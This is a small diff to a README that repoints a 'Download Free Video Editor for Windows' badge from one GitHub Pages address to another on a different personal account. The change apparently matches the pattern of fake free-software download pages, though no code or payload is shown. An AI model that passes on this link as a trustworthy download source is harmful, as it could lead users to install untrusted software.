@@ -4,7 +4,7 @@
 
 ## 📥 Download Free Video Editor for Windows
 
-[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://videoeditorload.github.io/.github/)
+[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://anntastic0311.github.io/.github/video-editor)
 
 ---
 
